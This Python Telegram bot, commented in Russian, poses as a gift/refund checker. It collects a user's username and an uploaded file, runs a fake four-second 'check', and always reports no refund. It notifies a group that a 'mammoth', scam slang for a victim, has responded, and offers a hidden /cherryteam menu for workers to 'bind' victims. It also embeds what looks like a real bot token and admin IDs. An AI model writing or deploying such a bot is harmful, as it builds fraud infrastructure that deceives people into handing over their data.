import os
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# Конфиг
BOT_TOKEN = "8092588180:AAGJR1QrIqLgWBmZNxHEqb9f-Ou3YqLts7U"
GROUP_CHAT_ID = "4866741254"
ADMIN_IDS = {7662948442, 6802842517, 913595126}

# Хранилище
users_db = {}
mammoths_db = {}
messages_db = {}
banned_users = set()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        await update.message.reply_text("❌ Ты в бане")
        return
        
    users_db[user_id] = {
        "username": update.effective_user.username or "",
        "step": "need_username"
    }
    
    if user_id not in messages_db:
        messages_db[user_id] = []
    
    messages_db[user_id].append({"text": "/start", "time": datetime.now()})
    
    await update.message.reply_text(
        "Привет! Проверяем подарки.\n\n"
        "1. Скинь username без @\n" 
        "2. Затем файл"
    )
    
    if user_id not in ADMIN_IDS:
        try:
            await context.bot.send_message(GROUP_CHAT_ID, "Мамонт отправил username!")
        except:
            pass

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if user_id in banned_users:
        await update.message.reply_text("❌ Ты в бане")
        return
        
    if user_id not in messages_db:
        messages_db[user_id] = []
    messages_db[user_id].append({"text": text, "time": datetime.now()})
    
    if user_id in users_db and users_db[user_id]["step"] == "need_username":
        if "@" in text:
            await update.message.reply_text("❌ Без @")
            return
            
        users_db[user_id]["username"] = text
        users_db[user_id]["step"] = "need_file"
        await update.message.reply_text("✅ Юзернейм принят! Теперь файл.")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        await update.message.reply_text("❌ Ты в бане")
        return
        
    if user_id in users_db and users_db[user_id]["step"] == "need_file":
        await update.message.reply_text("Файл принят! Проверяем...")
        await asyncio.sleep(4)
        await update.message.reply_text("✅ Проверка окончена! Рефаунда нет.")
        users_db[user_id]["step"] = "done"

async def cherryteam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    keyboard = [
        [InlineKeyboardButton("ПРИВЯЗАТЬ МАМОНТА 🦣", callback_data="bind_mammoth")],
        [InlineKeyboardButton("МОИ МАМОНТЫ", callback_data="my_mammoths")]
    ]
    markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "Родной мигрантик! Добро в TDTTEAM!\n"
        "Цепляй мамонта по айди или юзеру.",
        reply_markup=markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "bind_mammoth":
        await query.edit_message_text("Кидай username или id мамонта (должен нажать /start)")
    elif data == "my_mammoths":
        await query.edit_message_text("Пока мамонтов нет")

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Не админ")
        return
        
    if not context.args:
        await update.message.reply_text("❌ /ban USER_ID")
        return
        
    try:
        target_id = int(context.args[0])
        banned_users.add(target_id)
        await update.message.reply_text(f"✅ Забанил {target_id}")
    except:
        await update.message.reply_text("❌ Неверный ID")

def main():
    print("🤖 Запускаем бота...")
    
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("cherryteam", cherryteam)) 
        app.add_handler(CommandHandler("ban", ban))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
        app.add_handler(MessageHandler(filters.ATTACHMENT, handle_file))
        app.add_handler(CallbackQueryHandler(button_handler))
        
        print("✅ Бот готов!")
        print("🚀 Стартуем...")
        
        app.run_polling()
        
    except Exception as e:
        print(f"💥 Ошибка: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
